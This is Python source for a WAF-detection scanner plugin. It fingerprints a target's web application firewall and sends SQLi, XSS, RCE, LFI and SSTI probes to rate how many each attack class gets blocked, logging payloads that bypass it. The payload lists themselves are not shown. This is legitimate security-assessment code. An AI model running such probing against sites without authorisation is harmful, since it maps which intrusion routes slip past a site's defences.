# WAF 拦截状态码
_BLOCK_STATUS_CODES = {403, 406, 429, 444, 451, 493, 501, 503, 999}


class WafCheckPlugin(BasePlugin):
    """
    WAF / 防火墙探测插件 + 多维敏感度热力图

    通过发送多种攻击 payload 触发 WAF 拦截，
    然后匹配响应指纹库判断 WAF 类型。
    最后执行多维度攻击向量测试，生成防御能力矩阵。
    """

    meta = PluginMeta(
        name="waf_check",
        display_name="WAF Detector & Heatmap",
        description="探测目标是否部署 Web 应用防火墙，识别 WAF 类型，并生成多维防御能力热力图",
        severity=Severity.INFO,
        tags=["recon", "waf", "fingerprint", "heatmap"],
        version="2.0.0",
    )

    async def check(
        self,
        url: str,
        requester: AsyncRequester,
        context: Optional[Dict[str, Any]] = None,
    ) -> ScanResult:
        """
        主检测流程:
            1. 先用干净请求获取基线响应
            2. 依次发送 payload 触发 WAF
            3. 匹配指纹库
            4. 执行多维度敏感度测试 → 生成热力图
        """
        logger.info("[WAF] 开始探测: %s", url)

        # Step 1: 基线请求 — 正常响应
        try:
            baseline = await requester.get(url)
            baseline_status = baseline.status_code
        except Exception:
            baseline_status = -1

        # Step 2: 发送 payload 收集异常响应
        detections: List[Tuple[str, str]] = []  # [(waf_name, evidence), ...]

        for payload in _PROBE_PAYLOADS:
            try:
                resp = await requester.get(url, params=payload)
                matched = self._match_signatures(resp)
                for waf_name, evidence in matched:
                    detections.append((waf_name, evidence))

                # 如果状态码从 2xx 变成 403/406 等，本身就是 WAF 存在的证据
                if baseline_status in range(200, 400) and resp.status_code in (
                    403, 406, 429, 493, 501, 999,
                ):
                    detections.append(
                        (
                            "Unknown WAF",
                            f"状态码异变: {baseline_status} → {resp.status_code} "
                            f"(payload={payload.get('probe', '')})",
                        )
                    )

            except Exception as exc:
                logger.debug("[WAF] payload 请求异常: %s → %s", payload, exc)
                continue

        # Step 3: 整理结果
        if not detections:
            logger.info("[WAF] 未检测到 WAF: %s", url)
            return self.result(
                url,
                is_vulnerable=False,
                detail="未检测到 WAF / 防火墙",
            )

        # 去重 WAF 名称
        seen_wafs: Dict[str, List[str]] = {}
        for waf_name, evidence in detections:
            seen_wafs.setdefault(waf_name, []).append(evidence)

        waf_names = list(seen_wafs.keys())
        summary = "; ".join(
            f"{name} (证据×{len(evs)})" for name, evs in seen_wafs.items()
        )

        logger.info("[WAF] 检测到 WAF: %s → %s", url, summary)

        # ═══════════════════════════════════════
        # Step 4: 多维 WAF 敏感度热力图
        # ═══════════════════════════════════════
        heatmap = await self._build_heatmap(url, requester, baseline_status)

        # 热力图摘要信息
        heatmap_summary = ""
        if heatmap.dimensions:
            heatmap_summary = (
                f"\n\n📊 WAF 防御能力热力图:\n"
                f"  总体评分: {heatmap.overall_score:.1f}/100\n"
                f"  最强维度: {heatmap.strongest_dimension}\n"
                f"  最弱维度: {heatmap.weakest_dimension}\n"
            )
            for dim in heatmap.dimensions:
                bar = self._ascii_bar(dim.block_rate)
                heatmap_summary += (
                    f"  {dim.dimension}: {bar} "
                    f"{dim.block_rate*100:.0f}% [{dim.protection_level}]\n"
                )

        return self.result(
            url,
            is_vulnerable=True,
            detail=f"检测到 WAF: {', '.join(waf_names)}{heatmap_summary}",
            evidence=summary,
            extra={
                "waf_list": waf_names,
                "raw_detections": seen_wafs,
                "heatmap": heatmap.to_dict(),
            },
        )

    # ── 多维热力图构建 ────────────────────────

    async def _build_heatmap(
        self,
        url: str,
        requester: AsyncRequester,
        baseline_status: int,
    ) -> WafHeatmap:
        """
        执行多维度攻击向量测试，构建 WAF 敏感度热力图。

        对 SQLi, XSS, RCE, LFI, SSTI 五个维度分别发送探测 Payload，
        统计每个维度的拦截率并评定防护等级。
        """
        heatmap = WafHeatmap()
        all_block_rates: List[Tuple[str, float]] = []

        for vector in _ATTACK_VECTORS:
            dim_result = DimensionResult(
                dimension=vector.dimension,
                total_probes=len(vector.payloads),
            )

            for payload in vector.payloads:
                try:
                    resp = await requester.get(url, params={"test": payload})
                    if resp.status_code in _BLOCK_STATUS_CODES:
                        dim_result.blocked_count += 1
                    else:
                        dim_result.passed_count += 1
                        dim_result.bypassed_payloads.append(payload)
                except Exception:
                    dim_result.blocked_count += 1  # 连接被重置也算拦截

            # 计算拦截率
            if dim_result.total_probes > 0:
                dim_result.block_rate = (
                    dim_result.blocked_count / dim_result.total_probes
                )

            # 评定防护等级
            if dim_result.block_rate >= 0.90:
                dim_result.protection_level = "🟢 强防护"
            elif dim_result.block_rate >= 0.60:
                dim_result.protection_level = "🟡 中等防护"
            elif dim_result.block_rate >= 0.30:
                dim_result.protection_level = "🟠 弱防护"
            else:
                dim_result.protection_level = "🔴 无防护"

            heatmap.dimensions.append(dim_result)
            all_block_rates.append((vector.dimension, dim_result.block_rate))

            logger.info(
                "[WAF/Heatmap] %s: 拦截 %d/%d (%.0f%%) [%s]",
                vector.dimension,
                dim_result.blocked_count,
                dim_result.total_probes,
                dim_result.block_rate * 100,
                dim_result.protection_level,
            )

        # 总体评分 (各维度平均拦截率)
        if all_block_rates:
            avg_rate = sum(r for _, r in all_block_rates) / len(all_block_rates)
            heatmap.overall_score = avg_rate * 100

            # 最弱/最强维度
            sorted_rates = sorted(all_block_rates, key=lambda x: x[1])
            heatmap.weakest_dimension = sorted_rates[0][0]
            heatmap.strongest_dimension = sorted_rates[-1][0]

        return heatmap

    @staticmethod
    def _ascii_bar(rate: float) -> str:
        """生成 ASCII 进度条"""
        filled = int(rate * 10)
        empty = 10 - filled
        return "█" * filled + "░" * empty

    # ── 内部匹配逻辑 ────────────────────────

    def _match_signatures(
        self, resp: httpx.Response
    ) -> List[Tuple[str, str]]:
        """将响应与指纹库逐一匹配"""
        matches: List[Tuple[str, str]] = []
        resp_headers = {k.lower(): v for k, v in resp.headers.items()}
        resp_text = resp.text.lower() if resp.text else ""

        for sig in _WAF_SIGNATURES:
            # 响应头匹配
            for header, pattern in sig.header_patterns.items():
                header_val = resp_headers.get(header.lower(), "")
                if header_val and re.search(
                    pattern, header_val, re.IGNORECASE
                ):
                    matches.append(
                        (
                            sig.name,
                            f"Header [{header}: {header_val}] 匹配 /{pattern}/",
                        )
                    )

            # 响应体关键词匹配
            for keyword in sig.body_patterns:
                if keyword.lower() in resp_text:
                    matches.append(
                        (
                            sig.name,
                            f"Body 包含关键词: {keyword!r}",
                        )
                    )

            # 状态码匹配（辅助依据，不单独作为判定）
            if resp.status_code in sig.status_codes:
                # 仅当 header 或 body 也命中时才增加状态码证据
                if any(name == sig.name for name, _ in matches):
                    matches.append(
                        (
                            sig.name,
                            f"状态码 {resp.status_code} 在 WAF 特征码列表中",
                        )
                    )

        return matches
